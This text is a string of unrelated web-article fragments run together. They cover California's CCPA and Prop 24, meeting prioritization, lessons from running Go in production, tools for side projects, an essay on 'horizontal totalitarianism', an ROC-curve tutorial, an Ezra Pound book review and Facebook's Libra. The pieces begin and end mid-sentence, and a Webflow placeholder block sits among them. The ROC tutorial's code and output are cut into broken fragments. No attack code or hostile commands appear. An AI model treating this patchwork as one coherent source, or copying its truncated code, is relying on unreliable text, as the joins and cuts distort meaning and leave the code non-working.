leaving the burden with users to opt out. Essentially what this means is that under the CCPA privacy is not the default. And most consumers won’t take the time to click through pop-ups, on/off forms, or privacy settings to make the opt-out change.<br></p><p>This leaves the onus on companies to do right by the data they're collecting by default in order to avoid the legal ramifications that are now easier to enforce.<br></p><p>CCPA and Prop 24 are designed to protect consumers. In the best of worlds, protecting consumers also means protecting businesses from the fallout of poor data practices. Despite its best intentions, Prop 24 stumbles in achieving these goals. Enabling service providers to combine datasets makes companies who work with third-parties more vulnerable to data leaks, despite the protections those companies may have put in place through data anonymization.</p><p>Where Prop 24 does succeed is in paving a clear path for taking legal action against companies who misuse or fail to protect their users’ data. It’s up to companies to implement strong data protection practices regardless of the law’s lax requirements, to avoid costly fines and damaging leaks.<br></p></div><div><h2>What’s a Rich Text element?</h2><p>The rich text element allows you to create and format headings, paragraphs, blockquotes, images, and video all in one place instead of having to add and format them individually.

<p><em>I hear so many amazing humans in F1000, F500, F10 companies talking about having meetings from 7 to 6, from 8 to 6… and then trying to do their “actual” work after that. Meetings are “actual” work, so let’s make sure we’re prioritizing them, and saying no or “not yet” — just like we focus our other work. (And ideally, with our other work.)</em></p>



<p><strong>What would you see if you dumped all your meetings to a spreadsheet</strong>?<br>Try this format:<br>Column one, meeting name<br>Column two, meeting purpose (if a meeting doesn’t have this, you’ll want to add it)</p>



<p>And then… What if you stack ranked the meetings against each other? How might you prioritize?</p>



<p><strong>The Top Five</strong><br>Meet Chris, a product lead. They prioritized meetings starting with those critical to ensuring that their product was fit for customer love and business purpose… and that the business was fit for human growth, sustainability, and joy. (Note: They ended up with over 50 meetings for a three week period.)</p>



<ol><li>First Team Weekly Connect<br>Purpose: Connect as humans. Provide critical learnings and updates on our work to deliver on our quarterly strategies.</li><li>1:1s With Humans that Report to Me<br>Purpose: Connect as humans. Discuss learnings and co-create next steps towards desired personal growth and human innovation for this individual.</li><li>1:1 With the Human I Report to<br>Purpose: Connect as humans. Discuss my learnings and co-create next steps towards my desired personal growth and human innovation for me, personally.</li><li>First Team Steering (Quarterly)<br>Purpose: Connect as humans, inspect results across value stream, adapt/steer our strategy, prepare to share with extended value stream team</li><li>Extended Value Stream Team Steering (Quarterly)<br>Purpose: Connect as humans, inspect results across value stream, adapt/steer our strategy, update our critical change effort (critical program/initiative) kanban, plan high level efforts for the critical change efforts for the next quarter</li></ol>



<p><strong>The Lowest Five<br></strong>To find the lowest five, it helped Chris to add these columns:<br>Column three, value I personally provide in this session.<br>Column four, value of this session to me/my product/my team</p>



<p>This made it easier to find meetings to which they could say “I’m not needed here” or “I’ll send someone else” — even meetings they could cancel altogether.</p>



<p>What they condensed: Numerous status meetings that had been replaced by sprint demos. Numerous small group meetings with one key stakeholder roundtable and re-prioritization meeting.</p>



<p>What they said “no” to: Meetings that they could send empowered team members to, instead (sometimes these team members were even already attending).</p>

<![CDATA[Go in Production – Lessons Learned]]>

November 6, 2020 | https://tdom.dev/go-in-production | <a href="https://web.archive.org/web/*/https://tdom.dev/go-in-production">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>I recently got a DevOps job that mostly involves writing a new backend system in Go completely from scratch. Here's what I learned having never actually used it in production, knowing it mostly just from personal projects.</p>

<p>At the start, we decided to try simply sticking with Go's http library and a simple routing library - <code> mux</code>.</p>
<p>However, I quickly ran into real-life, production problems:</p>
<ul>
<li><strong>Recovery middleware </strong> -  for logging &amp; silently handling panics in handler's code.</li>
<li><strong>Logging </strong> -  I wanted some solution that would print information about each request, including body params, auth tokens, etc. (for debugging purposes).</li>
<li><strong>Better error handling </strong> -  I wanted the errors to still be JSON responses with an error message and code.</li>
<li><strong>Other commonly-used middleware </strong> -  including JWT auth and CORS.</li>
</ul>
<p>I had two options; implement solutions to the above problems myself, use different 3rd party libraries for each problem, or pick a web framework that already does most (if not all) of these things.</p>
<p>I eventually decided to use the Echo web framework. With almost 20k GitHub stars, a pretty active community, and great documentation I thought it was a great tool for the job.</p>
<p><img src="https://tdom.dev/images/go-in-production/echo-site.png" alt="echo site"></p>
<p>I also found there to be a little less boilerplate when it comes to writing the apps in <code>echo</code> (mainly when parsing a json body, writing errors, and manually setting headers), leading to improved code readability.</p>
<p><img src="https://tdom.dev/images/go-in-production/echo-cmp-simple.png" alt="comparison"></p>
<p>However the real difference in productivity will be noticed when you have slightly more complex endpoints. You'll often run into cases where you need to validate certain JSON fields, and you'll want meaningful error messages describing what's wrong. If you want to do that without any library, your code will quickly become much harder to read:</p>
<p><img src="https://tdom.dev/images/go-in-production/echo-cmp-large.png" alt="comparison"></p>

<p>Go web frameworks (or go in general) don't enforce any particular file structure. If you ever used something like ASP.NET/ASP.NET Core, you'll know what I'm talking about when I say that some frameworks are tightly structured and many things are done implicitly by convention rather than explicitly specified.</p>
<p>The thing about Go is that it's really easy to skip learning about structuring your code and make it a hard to read+maintain mess. If you still don't know what I'm talking about, here's an example of a (<strong>bad</strong>) Go endpoint I wrote a while back:</p>
<p><img src="https://tdom.dev/images/go-in-production/bad-good-structure.png" alt="bad code"></p>
<p>Do you see what I mean? It's quite likely that the in total the "better" way will contain more lines in total after adding all the <code>CreateUser</code> and <code>CreateAgency</code> methods, but… It will be much easier to understand, reuse, debug, and modify later on as each method will have a single purpose.
If you haven't already, I highly recommend you have a look at the following resources for a good code structure:</p>
<ul>
<li><a href="https://github.com/ribice/gorsk">https://github.com/ribice/gorsk</a> - nice example of a basic REST API</li>
<li><a href="https://github.com/bxcodec/go-clean-arch">https://github.com/bxcodec/go-clean-arch</a> - also a REST API example, but more strictly following the "Clean Architecture" concepts</li>
</ul>
<p>In general, the concept is simple. You should separate the code that communicates with the database from the actual application logic itself, which should also stay separate from the transport/endpoint logic (in this example the HTTP endpoints).</p>

<p>When I first started programming in Go, I wanted to use the least libraries possible, so of course I opted in for using the <code>database/sql</code> package (with Postgres). Although the experience was OK, I came across quite a lot of boilerplate when querying data, especially having to use the Scan syntax.
This lead me to the following 2 options:</p>
<ul>
<li><code>sqlx </code> -  a lightweight wrapper on top of <code>database/sql</code> with some extensions that will make querying much easier.</li>
<li><code>gorm </code> -  an ORM (Object-Relational Mapping)  library for Go, which generates SQL models and queries based on your Go models.</li>
</ul>
<p>I don't think there's a clear "better" library, in the end it comes down to the use case and preference.</p>
<p><code>gorm</code> will probably make your life easier, especially if you often forget to add fields to queries after altering the database (because in gorm you won't have to do that at all).&nbsp;</p>
<p><code>sqlx</code> on the other hand is much more SQL centric, it's more like writing Go code to interface with SQL rather than gorm 's approach of generating SQL from Go code. It's nice if you prefer to have total control over your SQL and not having to learn new syntax of GORM.</p>

<p>One of the challenges I came across was configuring the project for production. There are always some differences between the dev and prod environments, such as what port the app should run on, the host and credentials for the database, and etc.</p>
<p>I've seen people configure their app variables via JSON, YAML, or even gitignored&nbsp;.go files. I personally found env files to work the best, especially with docker-compose:</p>
<p><img src="https://tdom.dev/images/go-in-production/docker-env.png" alt=".env">
<img src="https://tdom.dev/images/go-in-production/docker-compose.png" alt="docker-compose">
I usually combine these with the following utility functions:
<img src="https://tdom.dev/images/go-in-production/env-util.png" alt="Dockerfile">
Building the Docker image is also extremely easy in Go.:
<img src="https://tdom.dev/images/go-in-production/dockerfile.png" alt="Dockerfile"></p>

<p>There are also a few other things that came to my mind that I didn't consider worth their own sections:</p>
<ul>
<li><a href="https://tour.golang.org/basics/7">Named returns in Go</a></li>
<li><a href="https://golang.org/doc/effective_go.html">Effective Go</a></li>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
                <p>My favorite part about side projects comes after the initial build is complete and I can focus on scaling. At this point, it's valuable to consider tools that can help you focus on the main goal: Talking to and acquiring users in a data-driven manner. I've been through this process a few times now and wanted to take a minute to share my go-to tools:</p><p><br>🛠 <a href="http://arctype.com/">Arctype</a></p><p>Arctype is an easy to use SQL client. It looks and feels like a modern spreadsheet, making it one of the most user-friendly SQL clients on the market. Some of my favorite features overall includes:</p><ul><li><strong>Managing queries:</strong> I use it to query specific segments of users and have most of my queries for these segments saved. That way, I don't have to re-write long queries every time I wish to investigate my data.</li><li><strong>Collaboration:</strong> Arctype is designed to be a better alternative for teams. You can give team members different levels of access, share queries, and dashboards.</li><li><strong>Creating super simple dashboards (see below):</strong> I love tracking metrics from day 0 on my side projects. Understanding total users, increase, churn and more is super helpful. Arctype lets you build these dashboard easily through SQL queries.</li></ul><figure><img src="https://blog.arctype.com/content/images/2020/11/ezgif-3-a939f4dbebc4--1-.gif" alt=""><figcaption>The process of creating a table on the dashboard is simple and quick</figcaption></figure><p>Best part? It's free!</p><p>📈 <a href="http://getwaitlist.com/">Waitlist</a></p><p>Waitlist is a tool to increase sign-ups via gamified referrals. With their <a href="https://gist.github.com/Ryan-Ouyang/3727a28efe47c0a984b8de111aadffe4">no-code integrations</a>, it takes less than 5 minutes to set up a waitlist on your webpage. I specifically use it for:</p><ul><li><strong>User research:</strong> If users are willing to share your product with other users, that's already a positive sign. Reaching out to these users to understand their expectations and use cases can provide valuable information.</li><li><strong>Rewards:</strong> During its earliest days, Dropbox grew through its referral program. The vast majority of Dropbox users had free accounts with limited storage space. However, every user was given more free space for any additional users they sign up. Specifying rewards for users for successful referrals can further boost your growth.</li><li><strong>Demand:</strong> An important tool for marketing your product is showing excitement and traction. If you can begin markeitng your product and its demand already before launch, you can set yourself up for an incredible launch day.</li></ul><figure><img src="https://blog.arctype.com/content/images/2020/11/Screen-Shot-2020-11-03-at-14.41.26.png" alt="" srcset="https://blog.arctype.com/content/images/size/w600/2020/11/Screen-Shot-2020-11-03-at-14.41.26.png 600w, https://blog.arctype.com/content/images/size/w1000/2020/11/Screen-Shot-2020-11-03-at-14.41.26.png 1000w, https://blog.arctype.com/content/images/size/w1600/2020/11/Screen-Shot-2020-11-03-at-14.41.26.png 1600w, https://blog.arctype.com/content/images/2020/11/Screen-Shot-2020-11-03-at-14.41.26.png 1744w" sizes="(min-width: 720px) 720px"><figcaption><em>Full disclosure: I'm working on this product, so feel free to lmk if you have any questions!</em> :)</figcaption></figure><h3 id="-sentry">🔍 <a href="https://sentry.io/">Sentry</a></h3><p>Sentry is a monitoring platform that helps with discovering, triaging and prioritizing errors in real time. I didn't use Sentry until recently and previously relied on checking logs inside my EC2 instance (I know, super cumbersome). Sentry was a total gamechanger and here are my reasons why:</p><ul><li><strong>Stack traces:</strong> A stack track shows the stack of functions at the time an uncaught exception is thrown. That way, you can trace your error, with return values and data throughout the process.</li></ul><figure><img src="https://blog.arctype.com/content/images/2020/11/Untitled.png" alt="" srcset="https://blog.arctype.com/content/images/size/w600/2020/11/Untitled.png 600w, https://blog.arctype.com/content/images/size/w1000/2020/11/Untitled.png 1000w, https://blog.arctype.com/content/images/size/w1600/2020/11/Untitled.png 1600w, https://blog.arctype.com/content/images/2020/11/Untitled.png 1819w" sizes="(min-width: 720px) 720px"></figure><ul><li><strong>Showcasing specific events:</strong> With Sentry, you can investigate specific events and the logs associated with them.</li><li><strong>Collaboration:</strong> I no longer send screenshots, explanations and snippets of errors to collaborators, but rather send a link or assign errors accordingly.</li></ul><figure><img src="https://blog.arctype.com/content/images/2020/11/Untitled--1-.png" alt="" srcset="https://blog.arctype.com/content/images/size/w600/2020/11/Untitled--1-.png 600w, https://blog.arctype.com/content/images/size/w1000/2020/11/Untitled--1-.png 1000w, https://blog.arctype.com/content/images/2020/11/Untitled--1-.png 1065w" sizes="(min-width: 720px) 720px"></figure><p>Please let me know if you have any questions about these tools (I'm, naturally, an active and satsfied user of them all).

<p>There once was a society in which horizontal totalitarianism was so successful that, without any need for a State or institutions, simple social pressure from friends and neighbours was sufficient to conserve a culture and its customs, perhaps for over forty thousand years. One could even speculate that if Captain James Cook had not disembarked in Australia it may have lasted even longer. The indigenous people of this island-continent are suggestive of the power of horizontal totalitarianism as a form of organisation capable of formatting people so that practically any individual initiative that may alter traditional world-views and customs virtually disappears. Aboriginal Australians did not need to burn at the stake those who broke taboos or refused to respect and follow traditional rites. It was enough that their peers would exclude them from the community, and that they would then perish in the desert (see, for instance, Philip Clarke’s comprehensive anthropological history <em>Where the Ancestors Walked</em>, 2003).</p>



<p>In other societies, more technologically advanced and on the whole ideologically less monolithic, institutional repression has been necessary to eliminate ideologies and behaviours that diverge from horizontal totalitarian norms. In many places, professionalised clergy quickly assumed responsibility for fixing community laws and seeing that they were obeyed, using prosecution analogous to criminal trials against what was considered sinful conduct. These sins were widely understood as crimes against society, or rather, against the maintenance of totalitarian control over individual minds. This is the case, for example, of the ancient Hebrew priesthood, whose sentences were carried out collectively by the people through stoning, a fact that indicated that the punishment was not purely the responsibility of an authority that enforced its will from top to bottom, but also that of the neighbours and acquaintances of the sinner/offender. It was the community that took on and carried out the right to punish. Over time, the State increasingly assumed this power for itself, substituting a vertical order for the earlier horizontal one, which ultimately culminated in modern forms such as fascism and communism. Nowadays, aside from its use by the Cuban dictatorship for its own interests, as well as those who aspire to imitate it in other parts of Spanish-speaking Latin America, horizontal totalitarianism has lost its institutional power in almost all geographical locations and civilizations. This includes Australia, where the aboriginal people, like those of New Guinea, have had to accept modern respect for the individual and the separation, at least in theory, of church, State and ethnicity. However, this does not mean that horizontal totalitarianism is a thing of the ancient past. Even without an established institutional power, its social manifestations continue to oppress people in all too many places, and the modern Western world is no exception. In contrast to the vertical kind, horizontal totalitarianism does not by any means need to dominate public institutions in order to come into being, or to crush the individual, because it pre-dates and exists independently from these institutions.</p>



<p>&nbsp;In fact, horizontal totalitarianism may also arise without availing itself of institutional agency, since it does not require any institutions in order to repress or eliminate dissidents. It is difficult to fight against this type of totalitarianism because anyone could be one of its agents and its workings can remain opaque even to those who enthusiastically practice it in their daily lives. Horizontal totalitarianism represents a totalitarianism exercised by the majority (or a dominant minority able to sway and manipulate a majority) of a given community by oppressing other members of that community who do not adhere to its unwritten rules. It oppresses minorities as well as those who are seen as disturbing or threatening the homogeneity of the community as a unique and complete entity. In horizontal totalitarianism, there is no need for external authorities to impose their will, against whom the community of the oppressed can, in turn, rebel. Since the majority, made up of oppressors and their conformist followers, and the minority of oppressed people live on the same social plane, the persecuted can hardly rely on the solidarity of their fellow dissidents because they find themselves isolated and disempowered among the mass of individuals who apply the unwritten laws of uniformity, and of the totalitarian unity of the community.</p>



<p>It may seem excessive to some to term this horizontal oppression ‘totalitarian’. However, its consequences for people and societies are even more serious than those of vertical totalitarianism. An incalculable number of people have died at the hands of their neighbours and countrymen since the beginning of time. How many Muslim women have been stoned to death by their neighbours for not adhering to their society’s sexual mores? How many Hindu men and women have been murdered by their relatives for daring to marry outside their caste? How many individuals have died for not believing in their tribe’s chosen god? How many have died for daring to question the beliefs and prejudices held by the majority of people in their community? And we are not talking about primitive societies here, nor solely those of the past. Today, homosexual people still commit suicide in communities where widespread homophobia turns their existence into a living hell. We still see people exiled or forced to seek asylum because they refused to partake in the religious or political ideas of their people, or because they do not belong to the predominant ethnicity or ideological affiliation of their region. Criticism, whether more or less open; social vacuums; and the impossibility of leading a life of one’s own, continue to hound all those who, for whatever reason, are seen as being <em>abnormal</em>.</p>



<p>Even our private lives are threatened, and not only by corrupt and opportunistic politicians who take advantage of people’s prejudices to limit minority rights and secure their own power. This power, built on populism, is but the political face of horizontal totalitarianism. Thanks to the development of the surveillance methods and mutual control structures offered by information technologies, before long we might begin to receive scores (c.f. China’s social credit system) and, consequently, punishments and rewards, based on our neighbours’ or communities’ opinions of us. No longer will anyone wish to be original, extravagant or creative, nor outspokenly contrarian, because this may cause that group of people who judge us with each passing moment to turn against us. This phenomenon can be observed in the actions of existing successful public silencing initiatives, which confront questions and divergent opinions with insults, as seen in the unfortunate social media lynchings perpetrated in recent years by fanaticised supporters of MeToo or Black Lives Matter, or by similar movements with equally extreme ideologies. While it is true that these phenomena are not new, in the past they were only dangerous once they crossed into the physical realm, when people became a policing mass, as explained by Gustave Le Bon in <em>The Crowd: A Study of the Popular Mind </em>(<em>Psychologie des foules </em>1895). Thanks to current technologies and the eternal social instincts of the human being, the ‘mechanical solidarity’ of closed, traditional communities, as described by Émile Durkheim in <em>The Division of Labour in Society </em>(<em>De la division du travail social </em>1893), may even accumulate more repressive force today than it has already enjoyed for millennia.</p>



<p>The Internet has been and continues to be a powerful tool for unleashing self-expression and individual creativity. In theory, anyone can propose anything online, and by the same token, can oppose anything. Then again, it is important to ask oneself how many people might maintain their silence, or hide their convictions for fear of the aforementioned media lynchings. We are also aware of numerous children and adolescents who have committed suicide to escape cyberbullying perpetrated by their neighbours and classmates, for their apparent lack of conformity to some ideal or principle of normalcy prevalent at the time. For horizontal totalitarianism, social harassment is a powerful weapon that the Internet has not deactivated; one could even argue that its power has intensified, since the Internet makes it easy for the number of bullies to increase exponentially.</p>



<p>The danger appears even greater when taking into account that neither writers nor intellectuals wish to denounce it. On the contrary, the modern and postmodern idealisation of all manner of closed societies, from primitive tribes to rural villages, has inspired numerous texts precisely condemning that one place where the individual may, to an extent, escape horizontal totalitarianism. That is, the great modern city in which economic and political freedom prevail, as well as freedom to practice traditional customs. In the city, it is not possible for everyone to know and control you. Unlike the village or tribe, in which everyone knows everyone else, no one has any reason to know anything about you and thus you can carry on your life without fear of criticism or attacks from other members of the community. No one will disapprove of you because you do not attend mass or believe in the God or gods that the village or tribe dictates you should, make love in a way that is condemned by the ruling community’s morality, or fail to profess belief in your nationality being superior to that of foreigners. Aside from mandatory compliance with laws and the reciprocal respect essential to a peaceful coexistence, the individual is sovereign and is no longer a mere component of a mechanical social …</p></div></div>

In the context of machine learning and data science, you might use integrals to calculate area under the curve (for instance, to evaluate performance of a model with the ROC curve, or to calculate probability from densities.</p><p>In this article, you’ll learn about integrals and the area under the curve using the practical data science example of the area under the ROC curve used to compare the performances of two machine learning models. Building from this example, you’ll see the notion of area under the curve and integrals from a mathematical point of view (from my book Essential Math for Data Science).</p><h3 id="practical-project">Practical Project</h3><p>Let’s say that you would like to predict the quality of wines from various of their chemical properties.

The dataset comes from here: https://archive.ics.uci.edu/ml/datasets/wine+quality.

Should you be happy with this result?</p><h3 id="metrics-for-imbalanced-datasets">Metrics for Imbalanced Datasets</h3><h4 id="imbalanced-dataset">Imbalanced Dataset</h4><p>Since we separated the data into very good wines and not very good wines, the dataset is <em>imbalanced</em>: there are different quantities of data corresponding to each target class.</p><p>Let’s check how many observations you have in the negative (not very good wines) and positive classes (very good wines):</p><div><div><pre><code><span>(</span><span>y_train</span> <span>==</span> <span>0</span><span>).</span><span>sum</span><span>()</span> <span>/</span> <span>y_train</span><span>.</span><span>shape</span><span>[</span><span>0</span><span>]</span>

It will help you to see the advantages to use other metrics than the accuracy.</p><p>A very simple model using the fact that the dataset is imbalanced would always estimate the class with the largest number of observations. In your case, such a model would always estimate that all wines are bad and get a decent accuracy doing that.</p><p>Let’s simulate this model by creating random probabilities below 0.5 (for instance, a probability of 0.15 means that there is 15% chance that the class is positive).

In our example, the model could output only zeros and you would get around 86% of accuracy.</p><p>You need other metrics to assess the performance of models with imbalanced datasets.</p><h4 id="roc-curves">ROC Curves</h4><p>A good alternative to the accuracy is the Receiver Operating Characteristics (ROC) curve. You can check the very good explanations of Aurélien Géron about ROC curves in Géron, Aurélien. Hands-on machine learning with Scikit-Learn, Keras, and TensorFlow: Concepts, tools, and techniques to build intelligent systems. O’Reilly Media, 2019.</p><p>The main idea is to separate the estimations from the model into four categories:</p><ul><li>The true positives (TP): the prediction is 1 and the true class is 1.</li><li>The false positives (FP): the prediction is 1 but the true class is 0.</li><li>The true negatives (TN): the prediction is 0 and the true class is 0.</li><li>The false negatives (FN): the prediction is 0 but the true class is 1.</li></ul><p>Let’s calculate these values for your first logistic regression model. You can use the function <code>confusion_matrix</code> from Sklearn. It presents a table organized as following:</p><p><img src="https://hadrienj.github.io/assets/images/ch02_integrals/ch02_confusion_matrix.png" alt="Figure 2: Illustration of a confusion matrix." width="250px"> <em>Figure 2: Illustration of a confusion matrix.</em></p><div><div><pre><code><span>from</span> <span>sklearn.metrics</span> <span>import</span> <span>confusion_matrix</span>

       [ 66,   0]])
</code></pre></div></div><p>You can see that there is no positive observation that has been correctly classified (TP) with the random model.</p><h5 id="decision-threshold">Decision Threshold</h5><p>In classification tasks, you want to estimate the class of data samples. For models like logistic regression which outputs probabilities between 0 and 1, you need to convert this score to the class 0 or 1 using a <em>decision threshold</em>, or just <em>threshold</em>. A probability above the threshold is considered as a positive class. For instance, using the default choice of the decision threshold at 0.5, you consider that the estimated class is 1 when the model outputs a score above 0.5.</p><p>However, you can choose other thresholds, and the metrics you use to evaluate the performance of your model will depend on this threshold.</p><p>With the ROC curve, you consider multiple thresholds between 0 and 1 and calculate the true positive rate as a function of the false positive rate for each of them.</p><p>You can use the function <code>roc_curve</code> from Sklearn to calculate the false positive rate (fpr) and the true positive rate (tpr). The function outputs also the corresponding thresholds. Let’s try it with our simulated random model where outputs are only values bellow 0.5 (<code>y_pred_random_proba</code>).</p><div><div><pre><code><span>from</span> <span>sklearn.metrics</span> <span>import</span> <span>roc_curve</span>

<p><em>Ezra Pound, Italy and The Cantos</em>, by Massimo Bacigalupo, Clemson University Press, 346 pp, £64, ISBN: 978-1949979008</p>
<p>Ezra Pound is, perhaps, the most troubling of all the Modernist presences in Anglophone literature – a fascist and an unrepentant antisemite even after the Holocaust revealed the ultimate end of that obnoxious prejudice – yet he was a brilliant poet, a brilliant synthesiser of cultures and absolutely central to Modernism in English. Born in Hailey, Idaho in 1885, he came to Europe in 1908, first to Gibraltar as a tour guide, later to Genoa and then to London, where he lived for ten years. During his stay there he made the acquaintance of all the Modernist poets and was, by the time he left for Paris and Italy, already a significant figure in that literary movement. He arrived in Rapallo, Italy, in 1924 and lived there until 1945, when he was forcibly repatriated to the USA to stand trial for his wartime collaboration with the Italian government. While in London he was a hugely influential editor and critic and his influence would be continued from his base in Italy. His role in the work of Eliot and Yeats, among many others, is well-known, as is his furious proselytising on behalf of James Joyce, who said of him: “It is probable that but for him I should still be the unknown drudge that he discovered.” Eliot, in dedicating “The Waste Land” to Pound, called him <em>il miglior fabbro</em> ‑ the best craftsman (a quotation from Dante).</p>
<p><em>Ezra Pound, Italy and the Cantos</em> comes from the pen of one of the foremost Pound critics. Massimo Bacigalupo grew up in Rapallo, Pound’s long-term home. His parents were friends of Pound’s and Bacigalupo himself would come to know him in what he calls his “complex and tormented final phase” in the postwar period when, as a broken man, he returned to his old ground. Besides literary criticism, Bacigalupo is an accomplished and multi-award-winning short-film-maker (the Turin Film festival dedicated a retrospective to his work in 2010) and many of the photographs included in the text are his; a prize-winning translator of, among others, Pound, Yeats and Wordsworth; and emeritus professor of Anglo-American literature at the University of Genoa. Bacigalupo’s personal relationship with the Pounds informs every aspect of his book and lends a more intimate air to his acute observations. </p>
<p>Had Pound, like Eliot, who was equally antisemitic and had fascist tendencies, confined himself to poetry we might remember him differently but it was his misfortune to fall under the spell of fascism and to be incapable of circumspection. Yeats, who admired the Blueshirts in Ireland, shared Pound’s contempt for democracy – indeed for the <em>demos</em> – his belief in an “aristocracy of the arts” and his contempt for the bourgeoisie. In the chaos that followed the First World War the idea of a political strongman was fatally attractive to many intellectuals. This is the context of Pound’s fascism, though I believe that antisemitism was the real poison in his blood. He correctly argued that “usury”, which we would call “finance capitalism”, would come to dominate Western society but believed it was a Jewish conspiracy and fascism was the cure. Not only does he argue that Jews are usurers but also very often the converse that financiers must be Jews, as in the case of the Scot John Law, who was controller general for France during the reign of Louis XIV. Pound calls him “Lawvi or Levi”, in other words, he guessed wrongly that Law was a cover for the Jewish name Levi – a classic antisemitic inductive error. He has the conspiracy theorist’s eye for detail, as well as his failure to grasp reality.</p>
<p>Pound’s biggest mistake was to make regular broadcasts for the fascist government of Italy during the war. These broadcasts, though never as targeted towards the Axis war effort as those of William Joyce, known as Lord Haw Haw, who was eventually hanged by the British, were nevertheless rightly considered rank propaganda for an enemy power. Pound’s broadcasts mainly consisted of rambling attacks on “usury”, Jews and the United States as well as samples of his own poetry, but they were monitored in the USA and considered to be aimed at undermining morale. In 1943, he was indicted for treason <em>in absentia</em>. On capture he was detained in a “cage” in Pisa for some time and then repatriated to stand trial. Because of the influence of his friends he did not receive the death sentence but was committed to St Elizabeth’s Psychiatric Hospital near Washington, where he remained for thirteen years.</p>
<p>Bacigalupo does not shy away from what he calls “the Pound vortex”, which, he says, “must be acknowledged in all its bewildering violence and historical dimensions”. Strangely, it is the Italian writers of the postwar Left who were most forgiving of his wartime stance. Pier Paolo Pasolini, for example, perhaps the most ferocious of antifascist writers and <em>auteurs</em>, was an admirer and there is a brief account here of a gentle and supportive interview he conducted with the poet in his final years. Carlo Izzo was another – scholar and translator <em>extraordinaire</em> of among many others Liam O’Flaherty – Pound referred to him as “my best translator”. Remarkably, considering that Izzo was a communist and a committed antifascist who married a Jewish woman and whose position at the University of Bologna was cancelled under Mussolini’s Race Law, the two men continued to correspond throughout the war years. In 1958, Izzo wrote sadly of Pound:</p>
<p>That he could have identified his world-view with that horror of doctrines that are among the most inhuman of all time, does suggest mental aberration. To say to an Italian Jew, on the day that Italy passed the racial laws that are so alien to the spirit of our civilisation: ‘I am sorry, but it is well done,’ is the act of someone not in his right mind. Six million of those ‘I am sorry’ wouldn’t have saved one of the six million innocents who were ‘Liquidated’. I remember this incident without rancour …</p>
<p>Elsewhere he remarks, having listed Pound’s greetings to Venetian writers, several of whom were Jewish, that “Pound’s antisemitism was almost ludicrously theoretical”. In a valedictory piece after Pound’s death, Izzo wrote revealingly of their correspondence: “I cannot say that I ever had with Pound a real human relationship, since he was so remote from reality, and conversed in fragments, sometimes somewhat childishly.” The latter, I suspect, is a reference to the strange pastiche of Pound’s letter-writing, full of jokey attempts at demotic accents like Dickens on a bad day, and verbal ticks and wordplays and a random mix of languages. But, at the same time he wrote that “Pound was essentially … <em>il miglior fabbro</em>”,<em> </em>echoing Eliot’s “Waste Land” dedication.</p>
<p>Another Italian writer who admired and worked with Pound was Eugenio Montale, a Nobel Prize winner, born in Genoa. He lived a considerable part of his life just down the road from Rapallo at Monterosso in the Cinque Terre. But Montale did not follow him in his admiration for Mussolini nor his antisemitism (he was antifascist, had a Jewish lover and had many Jewish friends). Montale was an acute reader of poetry in English and grasped the beauty of Pound’s work. Bacigalupo devotes a chapter to the relationship. </p>
<p>Of the later <em>Cantos</em>, Montale wrote that they contained “a flood of haikus, that, should most of the poem be destroyed, would be the marvel of posterity”, but equally he could say, in an article on Pound’s release from St Elizabeth’s Hospital that Pound was “generous in helping the young of his generation, yet remained indifferent to the misery of a mass of innocents herded to the worst of deaths in the gas chambers”. He was amused by Pound’s lack of knowledge of the works he championed and translated, in particular his translation of Cavalcanti, which met widespread criticism. He understood too, that Pound collected bright objects from literature and history, polished them and placed them in contrapuntal dialogue, a form of homage to the original, but he did not necessarily understand the objects he selected. Pound’s Italian was not perfect and he knew almost nothing of the Oriental languages from which he “translated”; nevertheless, he often achieved an intense engagement with the poets which a better linguist might not have achieved. Bacigalupo maintains convincingly that though Pound had a profound influence upon Montale, turning him from the more conventional lyricism of his 1925 collection <em>Ossi di Seppia</em> (Cuttlefish Bones) to the more modernist 1939 volume <em>Le Occasioni</em> (The Occasions).</p>
<p>One of the delights of this study is what we might call the topographical analysis. The book falls fairly neatly into two parts – studies of the <em>Cantos</em> in relation to places and people, a sort of Baedeker to Pound’s inner geography, fittingly when we consider how Pound took Italy as the touchstone for the world. It is not so much that Pound is an Italophile, but that he saw the world by looking out from Italy, a world with Italy in the foreground. Montale himself noted Pound’s Italocentric <em>weltanschauung</em>: “Only in Rapallo, which he called ‘the world’s navel’ did he feel at home … He needed Italian pretexts.” Thus, the book begins and ends at the place closest to Pound’s ‑ and Bacigalupo’s – heart, the city and environs of Rapallo on the northwest Riviera coast of Italy, having strayed, in the meantime, to Venice and Rome and onwards. </p>
<p>Bacigalupo’s intimacy with the landscape in which the <em>Cantos</em> were composed is a delight. At the outset, he takes us on a walk from Pound’s seafront attic in Via Marsala to the village of Sant’Ambrogio on the slopes of Montallegro, following Pound’s daily itinerary from his home and wife (Dorothy Shakespear) to his lover Olga Rudge. From the attic he sees the sandboats run up on the beach at Rapallo: “the boats’ sails hung loose at the mooring, / cloud like a sail inverted / and the men dumping sand by the sea-wall”. On another occasion …</p></div></div>

                <p>Facebook’s ‘Libra’ digital currency project combined incompetence and arrogance and was bound to fail, says David Gerard, our guest on the latest <em>New Money Review</em> podcast.</p>
<p>Gerard, a technology expert and journalist, is the author of a new book, called ‘<a href="https://davidgerard.co.uk/blockchain/about/">Libra Shrugged</a>’, on what he sees as Facebook’s attempts to take over the world’s money.</p>
<p><img loading="lazy" src="https://newmoneyreview.com/wp-content/uploads/2020/11/DG.jpg" alt="" width="240" height="321" srcset="https://newmoneyreview.com/wp-content/uploads/2020/11/DG.jpg 900w, https://newmoneyreview.com/wp-content/uploads/2020/11/DG-225x300.jpg 225w, https://newmoneyreview.com/wp-content/uploads/2020/11/DG-768x1024.jpg 768w" sizes="(max-width: 240px) 100vw, 240px"></p>
<p><em>David Gerard</em></p>
<p>In June last year, <a href="https://newmoneyreview.com/index.php/2019/06/18/zuckerberg-launches-his-global-currency-project/">Facebook CEO Mark Zuckerberg announced his firm’s ambitions to provide the first global medium of exchange</a>, for use across the firm’s social media channels, which include Messenger, WhatsApp and Instagram and reach over 2bn global users.</p>
<p>According to Gerard, Facebook’s bid to launch a private currency was motivated by its desire to collect even more of our personal data.</p>
<p>And if regulators hadn’t prevented the launch of Libra, says Gerard, the US technology firm would have obtained an almost impregnable competitive advantage, he argues.</p>
<blockquote><p>Libra combined incompetence and arrogance and was bound to fail</p></blockquote>
<p>“If you think Facebook is hard to regulate now — just think how hard Facebook would be to regulate if it controlled not just the money, but your access to financial services outside Facebook,” he writes in his new book.</p>
